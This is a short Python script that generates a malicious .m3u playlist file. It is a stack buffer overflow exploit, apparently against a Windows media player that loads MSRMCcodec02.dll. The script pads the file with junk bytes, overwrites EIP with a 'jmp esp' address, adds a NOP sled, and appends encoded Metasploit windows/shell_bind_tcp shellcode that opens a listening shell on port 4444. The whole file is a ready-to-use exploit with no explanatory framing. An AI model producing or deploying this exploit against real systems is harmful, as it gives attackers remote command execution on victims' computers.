import struct

file = "crash8.m3u"
junk = "\x41" * 26055

# Packs the address in little-endian.
# jmp esp from MSRMCcodec02.dll
eip = struct.pack('<I', 0x01B1B22A)

nops = "\x90" * 25

# Encoder: x86/fnstenv_mov
# Payload size: 350 bytes
# EXITFUNC=seh, LPORT=4444
# Payload: windows/shell_bind_tcp
buf = "\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\xfe\x95\x6e\xc4\x83\xeb\xfc\xe2\xf4\x02\x7d\xec\xc4"
buf += "\xfe\x95\x0e\x4d\x1b\xa4\xae\xa0\x75\xc5\x5e\x4f\xac"
buf += "\x99\xe5\x96\xea\x1e\x1c\xec\xf1\x22\x24\xe2\xcf\x6a"
buf += "\xc2\xf8\x9f\xe9\x6c\xe8\xde\x54\xa1\xc9\xff\x52\x8c"
buf += "\x36\xac\xc2\xe5\x96\xee\x1e\x24\xf8\x75\xd9\x7f\xbc"
buf += "\x1d\xdd\x6f\x15\xaf\x1e\x37\xe4\xff\x46\xe5\x8d\xe6"
buf += "\x76\x54\x8d\x75\xa1\xe5\xc5\x28\xa4\x91\x68\x3f\x5a"
buf += "\x63\xc5\x39\xad\x8e\xb1\x08\x96\x13\x3c\xc5\xe8\x4a"
buf += "\xb1\x1a\xcd\xe5\x9c\xda\x94\xbd\xa2\x75\x99\x25\x4f"
buf += "\xa6\x89\x6f\x17\x75\x91\xe5\xc5\x2e\x1c\x2a\xe0\xda"
buf += "\xce\x35\xa5\xa7\xcf\x3f\x3b\x1e\xca\x31\x9e\x75\x87"
buf += "\x85\x49\xa3\xfd\x5d\xf6\xfe\x95\x06\xb3\x8d\xa7\x31"
buf += "\x90\x96\xd9\x19\xe2\xf9\x6a\xbb\x7c\x6e\x94\x6e\xc4"
buf += "\xd7\x51\x3a\x94\x96\xbc\xee\xaf\xfe\x6a\xbb\xae\xf6"
buf += "\xcc\x3e\x26\x03\xd5\x3e\x84\xae\xfd\x84\xcb\x21\x75"
buf += "\x91\x11\x69\xfd\x6c\xc4\xef\xc9\xe7\x22\x94\x85\x38"
buf += "\x93\x96\x57\xb5\xf3\x99\x6a\xbb\x93\x96\x22\x87\xfc"
buf += "\x01\x6a\xbb\x93\x96\xe1\x82\xff\x1f\x6a\xbb\x93\x69"
buf += "\xfd\x1b\xaa\xb3\xf4\x91\x11\x96\xf6\x03\xa0\xfe\x1c"
buf += "\x8d\x93\xa9\xc2\x5f\x32\x94\x87\x37\x92\x1c\x68\x08"
buf += "\x03\xba\xb1\x52\xc5\xff\x18\x2a\xe0\xee\x53\x6e\x80"
buf += "\xaa\xc5\x38\x92\xa8\xd3\x38\x8a\xa8\xc3\x3d\x92\x96"
buf += "\xec\xa2\xfb\x78\x6a\xbb\x4d\x1e\xdb\x38\x82\x01\xa5"
buf += "\x06\xcc\x79\x88\x0e\x3b\x2b\x2e\x90\xca\xcc\x7f\x06"
buf += "\x62\x6b\x28\xf3\x3b\x2b\xa9\x68\xb8\xf4\x15\x95\x24"
buf += "\x8b\x90\xd5\x83\xed\xe7\x01\xae\xfe\xc6\x91\x11"

junk_shell = junk + eip + nops + buf

creation = open(file, 'w')
creation.write(junk_shell)
creation.close()

print("m3u File Created Successfully\n")

